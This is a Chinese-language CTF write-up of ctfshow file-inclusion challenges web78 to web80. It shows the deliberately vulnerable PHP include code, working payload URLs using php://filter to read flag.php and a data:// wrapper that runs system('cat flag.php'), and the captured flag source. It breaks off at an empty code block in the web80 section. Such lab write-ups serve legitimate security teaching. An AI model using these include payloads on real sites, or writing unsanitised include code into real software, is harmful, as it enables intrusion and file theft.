---
description: 这里主要是记录ctfshow的web入门的文件包含的wp。
---

# 🍌 CTFSHOW文件包含

## <mark style="color:purple;background-color:green;">（1）WEB 78</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 10:52:43
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 10:54:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

这个题目其实和我们当时做RCE远程代码执行的时候有做到过，我们如果要通过include读取文件，就需要用到http://filter协议去读取源码

```url
http://4258ef9c-e6a8-45ef-a0b4-b43bc0a5a484.challenge.ctf.show/?file=php://filter/read=convert.base64-encode/resource=flag.php
```

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

得到的base64编码是

```
PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0xNiAxMDo1NToxMQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMTYgMTA6NTU6MjANCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxhZz0iY3Rmc2hvd3s0MTgyMmFiNi05MzBjLTQxMTUtYWFlNi02NjYyNDg2ZmE3MWN9Ijs=
```

解码得

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 10:55:11
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 10:55:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


$flag="ctfshow{41822ab6-930c-4115-aae6-6662486fa71c}";
```

***



## <mark style="color:purple;background-color:green;">（2）WEB79</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:10:14
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:12:38
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

上述代码的意思大概就是，我们得到的$file变量，要先将php替换为？？？再进行执行，那么我们读取文件就不能用php://filter和php://input这两个了，我们可以使用data://去通过include去执行我们输入的php片段，这个php片段可以直接查看flag.php代码。

```url
http://928e3ddc-0ea1-404a-a9d9-fb53aface656.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
```

得到最后的flag。

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;background-color:green;">（3）web80</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:26:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

这次不止过滤了php，还过滤了data，所以现在只能使用

```
```



















































































